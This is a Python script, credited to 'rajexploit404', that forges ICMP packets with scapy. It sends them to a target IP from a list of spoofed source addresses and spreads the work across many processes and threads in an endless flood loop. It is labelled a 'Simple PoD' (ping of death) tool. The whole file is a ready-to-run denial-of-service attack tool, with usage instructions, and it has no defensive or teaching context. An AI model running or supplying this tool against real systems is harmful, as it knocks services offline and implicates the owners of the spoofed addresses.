from scapy.all import IP as ScapyIP, ICMP, send
import sys
import threading
import time
import multiprocessing
import os

class Style:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    CYAN = '\033[36m'
    RESET = '\033[0m'

style = Style()

def print_banner():
    banner = f"""
{style.CYAN}
  ██████╗  █████╗      ███████╗███████╗███████╗ ██████╗
 ██╔════╝ ██╔══██╗     ██╔════╝██╔════╝██╔════╝██╔═══██╗
 ██║  ███╗███████║     ███████╗█████╗  █████╗  ██║   ██║
 ██║   ██║██╔══██║     ╚════██║██╔══╝  ██╔══╝  ██║   ██║
 ╚██████╔╝██║  ██║     ███████║███████╗██║     ╚██████╔╝
  ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚══════╝╚═╝      ╚═════╝ 
{style.RESET}
  Simple PoD with IP Spoofed by rajexploit404
"""
    print(banner)

def load_spoofed_ips(file_path):
    try:
        with open(file_path, 'r') as file:
            spoofed_ips = [line.strip() for line in file if line.strip()]
        return spoofed_ips
    except FileNotFoundError:
        print(style.RED + "[!] Spoofed IP file not found!" + style.RESET)
        sys.exit()

def PoD(target_ip, spoofed_ip):
    try:
        packet = ScapyIP(src=spoofed_ip, dst=target_ip) / ICMP()
        send(packet, verbose=False)
        print(style.GREEN + f"[+] Packet sent from {spoofed_ip} to {target_ip}" + style.RESET)
    except Exception as e:
        print(style.RED + f"[!] Error sending packet: {e}" + style.RESET)

def thread_function(target_ip, spoofed_ip):
    PoD(target_ip, spoofed_ip)

def process_function(target_ip, spoofed_ips):
    for spoofed_ip in spoofed_ips:
        thread = threading.Thread(target=thread_function, args=(target_ip, spoofed_ip))
        thread.start()
        thread.join()

def main():
    print_banner()

    if os.geteuid() != 0:
        print(style.RED + "[!] This script must be run with sudo privileges!" + style.RESET)
        print(style.YELLOW + "Usage: sudo python3 main.py <target_ip> <list_spoof_ip>" + style.RESET)
        sys.exit()

    if len(sys.argv) < 3:
        print(style.RED + "[!] Invalid usage!" + style.RESET)
        print(style.YELLOW + "Usage: sudo python3 main.py <target_ip> <list_spoof_ip>" + style.RESET)
        sys.exit()

    target_ip = sys.argv[1]
    spoofed_ip_file = sys.argv[2]

    spoofed_ips = load_spoofed_ips(spoofed_ip_file)

    print(style.YELLOW + f"[?] Loaded {len(spoofed_ips)} spoofed IPs from {spoofed_ip_file}" + style.RESET)

    spoofed_ips_per_process = 50
    spoofed_ip_chunks = [spoofed_ips[i:i + spoofed_ips_per_process] for i in range(0, len(spoofed_ips), spoofed_ips_per_process)]

    print(style.YELLOW + "[?] Starting packet flood..." + style.RESET)

    while True:
        processes = []
        for chunk in spoofed_ip_chunks:
            process = multiprocessing.Process(target=process_function, args=(target_ip, chunk))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()

        print(style.YELLOW + "[?] Round completed, starting again..." + style.RESET)
        time.sleep(0.00000001)

if __name__ == "__main__":
    main()
